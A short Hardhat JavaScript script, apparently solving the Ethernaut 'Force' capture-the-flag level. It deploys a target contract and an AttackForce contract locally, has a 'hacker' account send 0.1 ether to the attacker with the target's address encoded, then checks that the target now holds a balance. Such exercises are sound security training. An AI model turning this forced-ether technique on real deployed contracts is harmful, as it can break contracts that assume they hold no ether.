const hre = require("hardhat");

async function main() {
  const [ownerDeployer, hacker] = await hre.ethers.getSigners();

  const Force = await hre.ethers.getContractFactory("Force");
  const force = await Force.deploy();
  await force.deployed();

  const AttackForce = await hre.ethers.getContractFactory("AttackForce");
  const attackForce = await AttackForce.deploy();
  await attackForce.deployed();

  const encodedAddressForce = ethers.utils.defaultAbiCoder.encode(["address"], [force.address.toString()])

  const tx = await hacker.sendTransaction({
    to: attackForce.address,
    from: hacker.address,
    value: ethers.utils.parseEther("0.1"),
    data: encodedAddressForce,
    gasLimit: 100000,
  });
  await tx.wait();

  const provider = hre.ethers.provider;
  const balance = await provider.getBalance(force.address);
  console.log(balance > 0)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
